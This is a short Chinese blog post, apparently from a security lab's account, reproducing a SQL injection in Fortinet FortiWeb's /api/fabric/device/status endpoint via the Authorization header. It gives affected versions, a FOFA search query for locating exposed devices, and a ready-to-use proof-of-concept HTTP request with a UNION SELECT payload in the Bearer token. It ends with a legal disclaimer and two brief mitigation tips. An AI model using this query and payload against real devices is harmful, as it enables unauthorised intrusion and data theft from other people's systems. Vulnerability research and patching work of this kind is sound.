#  【已复现】飞塔Authorization SQL注入CVE-2025-25257  
原创 zz  星络安全实验室   2025-07-17 06:14  
  
<table><tbody><tr><td data-colwidth="576"><section><span style="color: rgba(0, 0, 0, 0.9);font-family: &#34;PingFang SC&#34;, system-ui, -apple-system, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 16px;font-style: normal;font-variant-ligatures: normal;font-variant-caps: normal;font-weight: 400;letter-spacing: 0.544px;orphans: 2;text-align: justify;text-indent: 0px;text-transform: none;widows: 2;word-spacing: 0px;-webkit-text-stroke-width: 0px;background-color: rgb(255, 255, 255);text-decoration-thickness: initial;text-decoration-style: initial;text-decoration-color: initial;display: inline !important;float: none;" data-pm-slice="0 0 []"><span leaf="">免责声明:文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，未授权的攻击属于非法行为!文章中敏感信息均已做多层打码处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责作者不为此承担任何责任，一旦造成后果请自行负责</span></span></section></td></tr></tbody></table>  
漏洞详情：  
  
该漏洞存在于Fortinet FortiWeb设备的/api/fabric/device/status  
接口中，具体表现为：  
1. 注射点  
  
： Authorizatio  
1. 攻击方式  
：攻击者可构造恶意SQL查询注入认证头部  
1. 影响范围  
：可能导致身份验证绕过、敏感数据泄露或系统完全控制  
**影响版本:**  
  
7.0.0 <= FortiWeb <= 7.0.10  
  
7.2.0 <= FortiWeb <= 7.2.10  
  
7.4.0 <= FortiWeb <= 7.4.7  
  
7.6.0 <= FortiWeb <= 7.6.3  
  
**复现过程：**  
  
fofa：  
```
body="FortiWeb" && body="app.min.js"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVdvzQ1yNF1iagREs5Q0ibX5WYI2yXnVhWTtQkicia6HDGS3VQp6jNBpfQqBEz7FiaJFas7lavt06rqJV1g/640?wx_fmt=png&from=appmsg "")  
  
  
poc：  
```
GET /api/fabric/device/status HTTP/1.1
Host: xx
Authorization: Bearer 11111' UNION SELECT version(),2,3-- -
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ZxIkWliazrVdvzQ1yNF1iagREs5Q0ibX5WYJV1BYWZQX5JEewHhnncJ2hMRSaUjI8aZCwtTE86BbBDoAUZictngYcg/640?wx_fmt=png&from=appmsg "")  
  
防御建议：  
1. 立即限制对/api/fabric/device/status  
接口的访问  
1. 在FortiWeb上添加针对Authorization头的严格输入验证规则  
